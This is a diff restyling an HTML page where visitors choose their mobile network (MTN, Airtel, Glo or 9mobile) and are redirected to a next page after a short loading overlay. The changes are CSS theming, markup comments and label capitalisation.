@@ -40,8 +40,13 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   <meta name="robots" content="noindex,nofollow" />
   <style>
     *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
-      background: linear-gradient(135deg, #0a58ca, #1e90ff); 
+    
+    /* Pure Black Background */
+    html,body{
+      height:100%;
+      margin:0;
+      font-family: system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
+      background-color: #000000; 
     }
 
     .page-container {
@@ -52,58 +57,86 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       padding:20px;
     }
 
+    /* Sleek Charcoal Box */
     .selection-box {
-      background: #1a2a4e; 
+      background: #111111; 
       border-radius: 20px;
-      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-      padding: 30px;
+      box-shadow: 0 10px 40px rgba(255,255,255,0.03);
+      border: 1px solid #222222;
+      padding: 35px 30px;
       max-width: 450px;
       width: 100%;
       text-align: center;
       color: #fff;
     }
+
     .selection-box h2 {
-      font-size: 26px;
-      font-weight: bold;
-      color: #fedb70; 
+      font-size: 24px;
+      font-weight: 600;
+      color: #ffffff; 
+      margin-top: 0;
       margin-bottom: 30px;
+      letter-spacing: 0.5px;
     }
+
     .network-grid {
       display: grid;
       grid-template-columns: 1fr 1fr; 
-      gap: 20px; 
+      gap: 16px; 
     }
+
+    /* Premium Dark Buttons */
     .network-button {
-      background: #fff;
-      border-radius: 15px;
-      padding: 20px 10px;
+      background: #161616;
+      border-radius: 16px;
+      padding: 22px 10px;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       text-decoration: none;
-      color: #333;
-      font-weight: bold;
-      font-size: 16px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 15px;
+      transition: transform 0.2s ease, background-color 0.2s ease, box-shadow 0.2s ease;
       cursor: pointer;
     }
+
+    /* Hover States with Custom Glows */
     .network-button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+      transform: translateY(-4px);
     }
+    
+    .network-button.mtn:hover { 
+      background: rgba(255, 204, 0, 0.04);
+      box-shadow: 0 6px 20px rgba(255, 204, 0, 0.15);
+    }
+    .network-button.airtel:hover { 
+      background: rgba(227, 25, 55, 0.04);
+      box-shadow: 0 6px 20px rgba(227, 25, 55, 0.15);
+    }
+    .network-button.glo:hover { 
+      background: rgba(0, 255, 0, 0.02);
+      box-shadow: 0 6px 20px rgba(0, 255, 0, 0.1);
+    }
+    .network-button.ninemobile:hover { 
+      background: rgba(0, 102, 67, 0.05);
+      box-shadow: 0 6px 20px rgba(0, 102, 67, 0.15);
+    }
+
+    /* Darker Logo Containers */
     .network-button .logo-container { 
-      width: 50px; 
-      height: 50px;
+      width: 55px; 
+      height: 55px;
       border-radius: 50%; 
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
       overflow: hidden; 
-      background-color: #eee; 
+      background-color: #222222; 
     }
+
     .network-button .logo-container img {
         width: 100%;
         height: 100%;
@@ -111,10 +144,11 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         border-radius: 50%; 
     }
 
-    .network-button.mtn { border: 2px solid #ffcc00; }
-    .network-button.airtel { border: 2px solid #ff0000; }
-    .network-button.glo { border: 2px solid #008000; }
-    .network-button.ninemobile { border: 2px solid #000000; }
+    /* Explicit Brand Color Borders */
+    .network-button.mtn { border: 1.5px solid #ffcc00; }
+    .network-button.airtel { border: 1.5px solid #e31937; }
+    .network-button.glo { border: 1.5px solid #00ff00; }
+    .network-button.ninemobile { border: 1.5px solid #006643; }
 
     /* --- LOADING OVERLAY STYLES --- */
     #loading-bridge {
@@ -123,9 +157,9 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      backdrop-filter: blur(12px); /* The Blur Effect */
-      -webkit-backdrop-filter: blur(12px);
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
       display: none; 
       justify-content: center;
       align-items: center;
@@ -135,13 +169,13 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     }
 
     .spinner {
-      width: 55px;
-      height: 55px;
-      border: 5px solid rgba(255, 255, 255, 0.2);
-      border-top: 5px solid #ffffff; 
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      border-top: 4px solid #ffffff; 
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
-      margin-bottom: 15px;
+      margin-bottom: 20px;
     }
 
     @keyframes spin {
@@ -150,8 +184,9 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     }
 
     .loading-text {
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 500;
+      letter-spacing: 0.5px;
       opacity: 0.9;
     }
   </style>
@@ -163,7 +198,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         // Show the blurred overlay
         bridge.style.display = 'flex';
 
-        // 1.5 second delay before moving to page1.html
+        // 3 second delay before moving to page1.html (Per original script logic)
         setTimeout(() => {
             window.location.href = 'page1.html';
         }, 3000);
@@ -182,30 +217,39 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     <div class="selection-box">
       <h2>Your Network</h2>
       <div class="network-grid">
+        
+        <!-- MTN -->
         <a href="javascript:void(0);" class="network-button mtn" onclick="redirectToPage3('MTN');">
           <div class="logo-container">
             <img src="https://i.postimg.cc/KjC3gQP2/download-1.png" alt="MTN Logo" />
           </div>
           <span>MTN</span>
         </a>
+
+        <!-- Airtel -->
         <a href="javascript:void(0);" class="network-button airtel" onclick="redirectToPage3('AIRTEL');">
           <div class="logo-container">
             <img src="https://i.postimg.cc/76xWpnJd/images-2.png" alt="Airtel Logo" />
           </div>
-          <span>AIRTEL</span>
+          <span>Airtel</span>
         </a>
+
+        <!-- Glo -->
         <a href="javascript:void(0);" class="network-button glo" onclick="redirectToPage3('GLO');">
           <div class="logo-container">
             <img src="https://i.postimg.cc/ZqDwMzZh/images-2-17.jpg" alt="GLO Logo" />
           </div>
-          <span>GLO</span>
+          <span>Glo</span>
         </a>
+
+        <!-- 9mobile -->
         <a href="javascript:void(0);" class="network-button ninemobile" onclick="redirectToPage3('9MOBILE');">
           <div class="logo-container">
             <img src="https://i.postimg.cc/FHTpYXfX/images-2-20.jpg" alt="9Mobile Logo" />
           </div>
-          <span>9MOBILE</span>
+          <span>9mobile</span>
         </a>
+
       </div>
     </div>
   </div>
